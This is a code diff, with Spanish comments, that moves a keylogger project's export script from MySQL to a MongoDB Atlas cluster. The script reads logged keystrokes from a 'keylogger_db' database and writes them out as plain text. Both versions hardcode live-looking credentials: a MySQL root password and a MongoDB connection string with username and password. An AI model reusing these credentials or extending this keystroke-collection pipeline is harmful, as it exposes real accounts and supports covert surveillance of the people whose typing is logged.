@@ -1,41 +1,33 @@
-import mysql.connector
+from pymongo import MongoClient
 
-# Configuración de la conexión a la base de datos MySQL
-db_config = {
-    'user': 'root',            # Reemplaza con tu usuario de MySQL
-    'password': 'proalafalda',      # Reemplaza con tu contraseña de MySQL
-    'host': '127.0.0.1',              # O la IP de tu servidor MySQL
-    'database': 'keylogger_db'        # El nombre de la base de datos que creaste
-}
+# Configuración de la conexión a MongoDB
+mongo_uri = "mongodb+srv://iraldejordan10:r5dcxq5RHNDrxt69@jarviscluster.et2fo.mongodb.net/"
+client = MongoClient(mongo_uri)
+db = client["keylogger_db"]       # Nombre de la base de datos
+collection = db["keystrokes"]     # Nombre de la colección
 
 def is_printable_key(key):
     """Determina si la tecla es un carácter imprimible o un espacio."""
     return key.isalnum() or key in {' ', '.', ',', '!', '?', '-', '_', '(', ')', ':', ';', '"', "'", '/'}
 
 def export_data_to_text_file():
-    # Conectar a la base de datos
-    conn = mysql.connector.connect(**db_config)
-    cursor = conn.cursor()
-
-    # Consultar todos los datos de la tabla
-    cursor.execute("SELECT `key` FROM keystrokes")
-
-    # Obtener todos los registros
-    records = cursor.fetchall()
+    # Consultar todos los datos de la colección
+    records = collection.find()
 
     # Nombre del archivo de salida
-    output_file = 'KeyloggerPersonal\keystrokes_output.txt'
+    output_file = 'KeyloggerPersonal\\keystrokes_output.txt'
 
     # Procesar los datos y añadir espacios cuando sea necesario
     text_data = ''
     for record in records:
-        key = record[0]
-        if key == 'Key.space':
-            text_data += ' '
-        elif is_printable_key(key):
-            text_data += key
-        else:
-            print(f"Entrada No Anotada {key}")
+        key = record.get('text', '')
+        for char in key:
+            if char == ' ':
+                text_data += ' '
+            elif is_printable_key(char):
+                text_data += char
+            else:
+                print(f"Entrada No Anotada: {char}")
 
     # Escribir los datos en el archivo de texto
     with open(output_file, 'w') as file:
@@ -43,11 +35,5 @@ def export_data_to_text_file():
 
     print(f'Datos exportados a {output_file}')
 
-    # Cerrar la conexión a la base de datos
-    cursor.close()
-    conn.close()
-
 # Ejecutar la función para exportar los datos
 export_data_to_text_file()
-
-#'KeyloggerPersonal\keystrokes_output.txt'
